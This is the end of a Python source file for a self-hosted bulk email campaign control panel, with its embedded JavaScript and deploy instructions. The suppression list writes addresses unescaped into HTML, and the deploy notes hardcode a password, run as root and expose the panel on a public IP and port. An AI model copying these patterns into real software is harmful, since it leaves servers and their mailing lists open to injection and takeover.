  const profile  = document.getElementById('l-profile').value;
  const csv      = document.getElementById('l-csv').value;
  const template = document.getElementById('l-template').value;
  const subject  = document.getElementById('l-subject').value.trim();
  const workers  = parseInt(document.getElementById('l-workers').value)||3;
  const rate     = parseFloat(document.getElementById('l-rate').value)||0.2;
  const campaign = document.getElementById('l-campaign').value.trim();
  const dry_run  = document.getElementById('l-dryrun').checked;

  if (!subject) { toast('Subject required', false); return; }
  if (!csv) { toast('No CSV selected', false); return; }
  if (!template) { toast('No template selected', false); return; }

  const r = await post('/api/launch', {profile, csv, template, subject, workers, rate, campaign, dry_run});
  showOut('launch-out', r);
  toast(r.output, r.ok);
  if (r.ok) setTimeout(loadStats, 1500);
}

async function stopCampaign(id) {
  const r = await post('/api/stop', {campaign: id});
  toast(r.output, r.ok);
  setTimeout(loadStats, 800);
}

// ── Log ────────────────────────────────────────────────────────
async function loadLog() {
  const r = await api('/api/log?n=80');
  const box = document.getElementById('log-box');
  if (!r.ok || !r.lines) return;
  box.innerHTML = r.lines.map(l => {
    if (l.includes('ERROR') || l.includes('failed') || l.includes('FAIL'))
      return `<span class="err">${escHtml(l)}</span>`;
    if (l.includes('WARN') || l.includes('retry'))
      return `<span class="warn">${escHtml(l)}</span>`;
    if (l.includes('sent') || l.includes('✓') || l.includes('OK') || l.includes('INFO'))
      return `<span class="ok">${escHtml(l)}</span>`;
    return escHtml(l);
  }).join('\n');
  box.scrollTop = box.scrollHeight;
}

function startLogRefresh() {
  stopLogRefresh();
  if (autoRefresh) logTimer = setInterval(loadLog, 5000);
}
function stopLogRefresh() {
  if (logTimer) { clearInterval(logTimer); logTimer = null; }
}
function toggleAutoRefresh() {
  autoRefresh = !autoRefresh;
  document.getElementById('ar-btn').textContent = autoRefresh ? '⏸ Pause' : '▶ Resume';
  autoRefresh ? startLogRefresh() : stopLogRefresh();
}

function escHtml(s) {
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

// ── Suppression ────────────────────────────────────────────────
async function loadSuppressed() {
  const q = document.getElementById('sup-search')?.value || '';
  const r = await api('/api/suppressed?q=' + encodeURIComponent(q));
  document.getElementById('sup-count').textContent = `${r.total} suppressed addresses`;
  const list = document.getElementById('sup-list');
  if (!r.emails || !r.emails.length) {
    list.innerHTML = '<p style="color:var(--muted);font-size:13px;padding:10px 0">No suppressed addresses.</p>';
    return;
  }
  list.innerHTML = r.emails.slice(0,200).map(e => `
    <div style="display:flex;align-items:center;justify-content:space-between;padding:7px 0;border-bottom:1px solid var(--dim)">
      <span style="font-family:var(--mono);font-size:12px;color:var(--text)">${e}</span>
      <button class="btn red sm" onclick="removeSuppressed('${e}')">Remove</button>
    </div>`).join('');
}

async function addSuppressed() {
  const email = document.getElementById('sup-add-email').value.trim();
  const r = await post('/api/suppressed/add', {email});
  toast(r.output, r.ok);
  if (r.ok) { document.getElementById('sup-add-email').value=''; loadSuppressed(); }
}

async function removeSuppressed(email) {
  const r = await post('/api/suppressed/remove', {email});
  toast(r.output, r.ok);
  if (r.ok) loadSuppressed();
}

// ── Bounces ────────────────────────────────────────────────────
async function processBounces() {
  const profile = document.getElementById('bounce-profile').value;
  showOut('bounce-out', {output: 'Processing bounces...'});
  const r = await post('/api/bounces/process', {profile});
  showOut('bounce-out', r);
  toast(r.output?.substring(0,60) || 'Done', r.ok);
}

// ── Templates ─────────────────────────────────────────────────
function loadPreview() {
  const name = document.getElementById('tpl-select').value;
  if (!name) return;
  document.getElementById('preview-frame').src = '/api/preview?name=' + encodeURIComponent(name);
}

// ── Init ───────────────────────────────────────────────────────
loadStats();
setInterval(loadStats, 30000);
</script>
</body></html>
"""

# ── Entry point ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import sys
    port = int(os.environ.get("SEKI_PANEL_PORT", 5001))
    print(f"⚡ Seki Panel starting on port {port}")
    app.run(host="0.0.0.0", port=port, debug=False)

"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
DEPLOY INSTRUCTIONS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Copy to VPS:
   cp seki_panel.py /opt/seki/seki_panel.py

2. Create systemd service:
   sudo nano /etc/systemd/system/seki-panel.service

   Paste:
   [Unit]
   Description=Seki Mailer Control Panel
   After=network.target

   [Service]
   Type=simple
   User=root
   WorkingDirectory=/opt/seki
   EnvironmentFile=/opt/sentinel/.env
   ExecStart=/opt/sentinel/venv/bin/python3 /opt/seki/seki_panel.py
   Restart=always
   RestartSec=5
   Environment=SEKI_PANEL_PASSWORD=seki2026

   [Install]
   WantedBy=multi-user.target

3. Enable and start:
   sudo systemctl daemon-reload
   sudo systemctl enable seki-panel
   sudo systemctl start seki-panel

4. Check it's running:
   sudo systemctl status seki-panel
   curl http://localhost:5001

5. Open firewall (if not already):
   sudo ufw allow 5001/tcp

Access at: http://62.146.170.20:5001
Password: seki2026 (change via SEKI_PANEL_PASSWORD env var)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
